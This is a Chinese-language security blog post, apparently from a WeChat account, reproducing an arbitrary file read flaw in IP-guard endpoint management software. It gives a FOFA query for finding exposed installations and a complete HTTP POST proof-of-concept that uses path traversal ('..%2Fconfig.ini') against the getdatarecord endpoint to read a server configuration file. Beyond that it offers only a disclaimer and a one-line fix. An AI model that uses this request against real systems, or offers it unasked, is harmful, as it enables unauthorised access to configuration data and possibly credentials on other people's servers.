#  漏洞复现 || IP-guard getdatarecord 任意文件读取   
韩文庚  我爱林   2024-04-20 16:16  
  
## 免责声明  
  
**我爱林攻防研究院的技术文章仅供参考，****任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得利用网络从事危害国家安全、荣誉和利益****，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**  
## 漏洞描述  
  
IP-guard是由溢信科技股份有限公司开发的一款终端安全管理软件，旨在帮助企业保护终端设备安全、数据安全、管理网络使用和简化IT系统管理  
。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlOhiclhNoQurIQkRJ2ULm2vN4EtqFw7rbNVrKsdgoIZPLZWD577fwbFEwQPmoFMJhicOym2OHiaOsvTw/640?wx_fmt=png&from=appmsg "")  
## 资产确定  
```
fofa： app="IP-guard"
```  
## 漏洞复现  
  
  
1.利用如下POC进行文件读取  
```
POST /ipg/appr/MApplyList/downloadFile_client/getdatarecord HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 64
Content-Type: application/x-www-form-urlencoded


path=..%2Fconfig.ini&filename=1&action=download&hidGuid=1v%0D%0A
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlOhiclhNoQurIQkRJ2ULm2vNtoDReALeJmz0oMKan7ibYkiboDe8UrUibyB1ibNl3cg9d21pmNTXjkAukA/640?wx_fmt=png&from=appmsg "")  
## 修复建议  
  
  
1.  
升级至安全版本  
  
  
如有侵权，请联系删除  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
**点它，分享点赞在看都在这里**  
  
